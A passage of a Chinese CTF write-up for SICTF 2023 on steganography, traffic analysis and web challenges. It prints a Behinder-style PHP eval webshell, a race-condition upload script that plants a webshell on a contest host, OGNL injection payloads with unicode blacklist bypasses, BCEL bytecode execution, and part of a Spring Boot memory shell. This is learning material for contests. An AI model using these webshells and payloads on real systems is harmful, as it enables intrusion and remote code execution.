class="hljs-number">116</span>    <span class="hljs-comment"># 创建一个空白图像</span>    image = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (width, height), color=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 1表示单色（黑白）</span>    <span class="hljs-comment"># 获取图像的像素访问对象</span>    pixels = image.load()    <span class="hljs-comment"># 将01数据填充到图像中</span>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):            index = y * width + x            <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">and</span> data[index] == <span class="hljs-number">48</span>:                pixels[x, y] = <span class="hljs-number">0</span>  <span class="hljs-comment"># 将0写为黑色像素点</span>            <span class="hljs-keyword">else</span>:                pixels[x, y] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 将0写为黑色像素点</span>    <span class="hljs-comment"># 保存图像为文件</span>    image.save(<span class="hljs-string">&quot;1.png&quot;</span>)    decocdeQR = decode(Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>))[<span class="hljs-number">0</span>].data    r.sendline(decocdeQR)    temp = r.recvline()    <span class="hljs-built_in">print</span>(temp)    temp = r.recvline()    <span class="hljs-built_in">print</span>(temp)</code></pre></div><h3 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3><p>赛后讨论说是提取像素脚本然后解密OOK</p><p>但即使知道思路，还是不知道怎么做，等着看WP吧</p><p>压缩包伪加密得到图片，stegsolve查看lsb隐写，发现图片（就只做到这里）</p><p>大小仅有20*20，不难想到flag被加密进了像素点里。写一个脚本提取像素点：</p><div class="code-wrapper"><pre><code class="hljs maxima">from PIL import Imageimg = Image.open(&#x27;&#x27;)<span class="hljs-built_in">width</span>,<span class="hljs-built_in">height</span> = img.sizepix = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">width</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">height</span>):        pix.<span class="hljs-built_in">append</span>(img.getpixel(i,j))<span class="hljs-built_in">print</span>(pix)</code></pre></div><div class="code-wrapper"><pre><code class="hljs scheme">[(<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">46</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">63</span>, <span class="hljs-number">46</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">46</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">33</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">63</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">63</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), ......, (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)]</code></pre></div><div class="code-wrapper"><pre><code class="hljs cos">对应<span class="hljs-keyword">ASCII</span>码<span class="hljs-number">46</span>-. <span class="hljs-number">33</span>-!<span class="hljs-number">63</span>-?</code></pre></div><p>然后联想到Ook</p><div class="code-wrapper"><pre><code class="hljs maxima">from PIL import Image<span class="hljs-built_in">image</span> = Image.open(&#x27;&#x27;)  # 替换为隐写出来的图片<span class="hljs-built_in">width</span>, <span class="hljs-built_in">height</span> = <span class="hljs-built_in">image</span>.sizepixel_data = []<span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">height</span>):    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">width</span>):        pixel = <span class="hljs-built_in">image</span>.getpixel((x, y))        pixel_data.<span class="hljs-built_in">append</span>(pixel)count = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(len(pixel_data)):    <span class="hljs-keyword">if</span>(pixel_data[i] == (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)):        <span class="hljs-built_in">break</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> pixel_data[i]:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ook&quot;</span>+chr(j),end = <span class="hljs-string">&quot;&quot;</span>)</code></pre></div><h3 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h3><p>自己的思路：提取http对象，发现上传的shell.php的内容，以及上传的一些数据</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-title function_ invoke__">session_start</span>();    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;2295d22e2d70888f&quot;</span>;<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))&#123;<span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];     &#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);&#125;    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>想着是上传的内容然后对应解密，但还是没思路，应该还是没看懂这段代码的原因</p><p>WP的思路差不多，对数据进行对应解密（我当时少了一层base64，只拿去AES解密导致什么都看不出来）</p><p>拿到加密方式后，可以看出，在openssl扩展有效时，这段代码对数据的解密方式为AES_128后base64，并且给了key的值(之后了解到这是很明显的<strong>冰蝎</strong>的特征)。那么就可以使用cyberchef，对之后的每个tcp流里的base64数据进行恢复：</p><p><img src="/2023/09/10/sictf2023/image-20230910182126677.png" alt="image-20230910182126677"></p><p>圈起来的地方注意一下，iv自行补0直到出现内容即可</p><p>然后把里面的信息解密出来看看</p><p><img src="/2023/09/10/sictf2023/image-20230910182455111.png" alt="image-20230910182455111"></p><p>tcp流有很多，大佬们贴出来的图是</p><p><img src="/2023/09/10/sictf2023/image-20230910182605633.png" alt="image-20230910182605633"></p><p>由此去解密响应信息（响应数据太多了，复现找不到两个文本的内容）</p><p><img src="/2023/09/10/sictf2023/image-20230910182736580.png" alt="image-20230910182736580"></p><p>GronKey.txt：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>,<span class="hljs-number">50</span>,<span class="hljs-number">61</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">63</span>,<span class="hljs-number">41</span></code></pre></div><p>flag.txt：</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</span></code></pre></div><p>根据GronKey找到Gronsfeld加密</p><p>（类似于凯撒这样的移位密码，每个字符根据对应数字进行移位，若密钥长度小于字符串，就从头再次开始）</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span>  Crypto.Util.number <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> pycipher <span class="hljs-keyword">import</span> Gronsfeldt = [<span class="hljs-number">1</span>,<span class="hljs-number">50</span>,<span class="hljs-number">61</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">63</span>,<span class="hljs-number">41</span>]<span class="hljs-keyword">temp</span> = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;print (Gronsfeld(t).decipher(<span class="hljs-keyword">temp</span>))</code></pre></div><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">SICTF</span><span class="hljs-template-variable">&#123;SHUMUISAGOODBOYYYYYYYYY&#125;</span></code></pre></div><h3 id="一起上号不"><a href="#一起上号不" class="headerlink" title="一起上号不"></a>一起上号不</h3><p>有关cs的流量分析，应该去找类似的题目的，但当时并不怎么想做，大佬们也是参照别的文章的解题顺序做的</p><p>导出http对象，获得一个key.zip，利用工具解密cobalstrike公钥和私钥</p><p><a href="https://github.com/Slzdude/cs-scripts">Slzdude&#x2F;cs-scripts: 研究CobaltStrike时的一些副产品 (github.com)</a></p><p>因为虚拟机坏了，只能先拿<code>unknown</code>师傅的图了</p><p><img src="/2023/09/10/sictf2023/image-20230910202300228.png" alt="image-20230910202300228"></p><p>有了私钥，拿去解<code>/load</code>路由中cookie中的元数据，拿到AES_KEY，HMAC_KEY</p><p><a href="https://github.com/WBGlIl/CS_Decrypt">WBGlIl&#x2F;CS_Decrypt (github.com)</a></p><p><img src="/2023/09/10/sictf2023/image-20230910202637906.png" alt="image-20230910202637906"></p><p>然后找到<code>/submit.php</code>下发送的POST请求内容</p><p>先hex解密再base64加密</p><p><img src="/2023/09/10/sictf2023/image-20230910202825317.png" alt="image-20230910202825317"></p><p><img src="/2023/09/10/sictf2023/image-20230910202851419.png" alt="image-20230910202851419"></p><p>总结下顺序：</p><ol><li>解密key文件，得到<code>private-key</code></li><li>拿到cookie中的元数据，解密出<code>AES_KEY</code>，<code>HMAC_KEY</code></li><li>找到<code>/submit.php</code>的数据，先hex解密再base64加密，然后跑脚本</li></ol><h3 id="还不上号-（easy-shark和一起上号的组合）"><a href="#还不上号-（easy-shark和一起上号的组合）" class="headerlink" title="还不上号 （easy_shark和一起上号的组合）"></a>还不上号 （easy_shark和一起上号的组合）</h3><p>两个流量包</p><p>内容高度一致，就说一下不同点吧</p><p>包一对比<code>easy_shark</code>缺少<code>key</code>（但我自己找不到<code>shell.php</code>的内容）</p><p>而包二中导出<strong>http</strong>对象有<code>key.zip</code></p><p>压缩包有加密，也没法进行明文攻击，那么就ziprello爆破，爆破得到密码<code>we1l</code></p><p>发现零宽字符隐写，解密时要点上这两个</p><p><img src="/2023/09/10/sictf2023/image-20230910210453746.png" alt="image-20230910210453746"></p><div class="code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span>52f1488563bf0e</code></pre></div><p>然后按照easy_shark的方式解密</p><p>得到两个文件</p><p>flag.txt：</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">SICTF</span>&#123;<span class="hljs-number">79</span>e1755e-<span class="hljs-number">08</span>a8-<span class="hljs-number">4</span>d</code></pre></div><p>key：<img src="/2023/09/10/sictf2023/image-20230910211920890.png" alt="image-20230910211920890"></p><p>剩下的和<code>一起上号不</code>一样</p><p>最后得到了个base32</p><p><img src="/2023/09/10/sictf2023/image-20230910212103449.png" alt="image-20230910212103449"></p><p>解密即可</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="include（签到）"><a href="#include（签到）" class="headerlink" title="include（签到）"></a>include（签到）</h3><p>很简单filter伪协议就可以</p><p>这里我尝试包含pearcmd.php （我虽然知道这种解法，但每次看到<code>include</code>都想不起来可以用这个）</p><p><img src="/2023/09/10/sictf2023/image-20230910212926345.png" alt="image-20230910212926345"></p><p><img src="/2023/09/10/sictf2023/image-20230910212949221.png" alt="image-20230910212949221"></p><h3 id="我全都要（拿了个二血）"><a href="#我全都要（拿了个二血）" class="headerlink" title="我全都要（拿了个二血）"></a>我全都要（拿了个二血）</h3><p>pop链不说了</p><h3 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h3><p>当时看到传不上去就想着条件竞争，但是不会操作</p><p>我印象中的竞争有session条件竞争，然后就是多线程</p><p>看了unknow师傅的wp，可以使用session的脚本</p><p>偷师傅的脚本</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><span class="hljs-comment"># Author：Y4tacker</span><span class="hljs-keyword">import</span> io<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> threadingsessid = <span class="hljs-string">&#x27;yyy&#x27;</span>url = <span class="hljs-string">&quot;http://210.44.151.51:10418/upload.php&quot;</span><span class="hljs-comment">##这里小改了一下</span>php = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">&lt;?php</span><span class="hljs-string">file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php eval($_GET[&quot;c&quot;]);?&gt;&#x27;);</span><span class="hljs-string">echo &#x27;bingo&#x27;;&#x27;&#x27;&#x27;</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        f = php        resp = session.post(url,                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">f&quot;123123213123&quot;</span>&#125;,                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;1.php&#x27;</span>, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        resp = session.get(<span class="hljs-string">&#x27;http://210.44.151.51:10418/uploads/1.php&#x27;</span>)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;bingo&quot;</span> <span class="hljs-keyword">in</span> resp.text:            <span class="hljs-built_in">print</span>(resp.text)            <span class="hljs-keyword">break</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    event = threading.Event()    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):            threading.Thread(target=write, args=(session,)).start()        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):            threading.Thread(target=read, args=(session,)).start()    event.<span class="hljs-built_in">set</span>()</code></pre></div><p><img src="/2023/09/10/sictf2023/image-20230910214204467.png" alt="image-20230910214204467"></p><h3 id="pain-（看了四种解法）"><a href="#pain-（看了四种解法）" class="headerlink" title="pain （看了四种解法）"></a>pain （看了四种解法）</h3><p>考察OGNL表达式</p><p>正常的命令执行是下面这样</p><div class="code-wrapper"><pre><code class="hljs reasonml">OgnlContext context = <span class="hljs-keyword">new</span> <span class="hljs-constructor">OgnlContext()</span>;<span class="hljs-comment">//context.setRoot(test);</span><span class="hljs-comment">//表达式</span>String express = <span class="hljs-string">&quot;(#a=@java.lang.Runtime@getRuntime.exec(&#x27;calc&#x27;)&quot;</span>;<span class="hljs-comment">//(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span>Object ognl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>parse<span class="hljs-constructor">Expression(<span class="hljs-params">express</span>)</span>;Object value = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>get<span class="hljs-constructor">Value(<span class="hljs-params">ognl</span>,<span class="hljs-params">context</span>,<span class="hljs-params">context</span>.<span class="hljs-params">getRoot</span>()</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(value);</code></pre></div><p>题目黑名单</p><p><img src="/2023/09/10/sictf2023/image-20230911153225651.png" alt="image-20230911153225651"></p><h4 id="unicode绕过"><a href="#unicode绕过" class="headerlink" title="unicode绕过"></a>unicode绕过</h4><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@java</span>.lang.\u0052untime<span class="hljs-variable">@g</span>\u0065t\<span class="hljs-built_in">u0052untime</span>().\<span class="hljs-built_in">u0065xec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div><p>记得url编码（我当时想的就是unicode，但没url编码网页报错400不知道咋办了）</p><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><div class="code-wrapper"><pre><code class="hljs clojure">(<span class="hljs-name">#a=new</span> java.util.Scanner(<span class="hljs-name"><span class="hljs-built_in">new</span></span> java.io.File(<span class="hljs-string">&quot;/flag&quot;</span>)).next())</code></pre></div><p>妙妙妙妙啊</p><h4 id="bcel字节码（unknow师傅的解法）"><a href="#bcel字节码（unknow师傅的解法）" class="headerlink" title="bcel字节码（unknow师傅的解法）"></a>bcel字节码（unknow师傅的解法）</h4><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.JavaWrapper;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> App &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main( String[] args ) throws <span class="hljs-keyword">Exception</span>&#123;        //第一种触发方式        //JavaClass javaClass = Repository.lookupClass(Evil.<span class="hljs-keyword">class</span>);        //        //String encode = Utility.encode(javaClass.getBytes(), <span class="hljs-keyword">true</span>);        //        //<span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(encode);        //<span class="hljs-built_in">new</span> ClassLoader().loadClass(&quot;$$BCEL$$&quot;+encode).newInstance();        //第二种触发方式        JavaClass javaClass = Repository.lookupClass(Evil.<span class="hljs-keyword">class</span>);        String encode = Utility.encode(javaClass.getBytes(), <span class="hljs-keyword">true</span>);        JavaWrapper._main(<span class="hljs-built_in">new</span> String[]&#123;&quot;$$BCEL$$&quot;+encode&#125;);        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;$$BCEL$$&quot;+encode);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-comment">//Evil.java</span><span class="hljs-keyword">import</span> java.<span class="hljs-property">io</span>.<span class="hljs-property">IOException</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">_main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-comment">//使用第一种方法的Evil.java</span><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(e);        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">public static void main( String<span class="hljs-literal">[]</span> args ) throws Exception&#123;    JavaClass javaClass = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(Evil.<span class="hljs-params">class</span>)</span>;    String encode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(javaClass.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);    String bcel = <span class="hljs-string">&quot;$$BCEL$$&quot;</span>+encode;    String code = <span class="hljs-string">&quot;@com.sun.org.apache.bcel.internal.util.JavaWrapper@_main(&#123;&#x27;&quot;</span>+bcel+<span class="hljs-string">&quot;&#x27;&#125;.toArray())&quot;</span>;    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLEncode</span>.</span></span>encode(code));     OgnlContext context = <span class="hljs-keyword">new</span> <span class="hljs-constructor">OgnlContext()</span>;    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>get<span class="hljs-constructor">Value(<span class="hljs-params">code</span>, <span class="hljs-params">context</span>, <span class="hljs-params">context</span>.<span class="hljs-params">getRoot</span>()</span>);&#125;</code></pre></div><p>本地自建的Evil.java，带不带包名都可以，都打得通。（保险起见还是带上吧）</p><h3 id="DoyouknowCC-（不会，先欠着）"><a href="#DoyouknowCC-（不会，先欠着）" class="headerlink" title="DoyouknowCC （不会，先欠着）"></a>DoyouknowCC （不会，先欠着）</h3><p>springboot &gt;2.6内存马</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.controller;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilController</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, NoSuchMethodException, IllegalAccessException &#123;        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>,<span class="hljs-number">0</span>);        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> EvilController.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);        field.setAccessible(<span class="hljs-literal">true</span>);        RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) field.get(mappingHandlerMapping);        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/cmd&quot;</span>).options(config).build();        <span class="hljs-type">EvilController</span> <span class="hljs-variable">springBootMemoryShellOfController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilController</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>);        mappingHandlerMapping.registerMapping(info,springBootMemoryShellOfController,method);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EvilController</span><span class="hljs-params">(String test)</span>&#123;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span 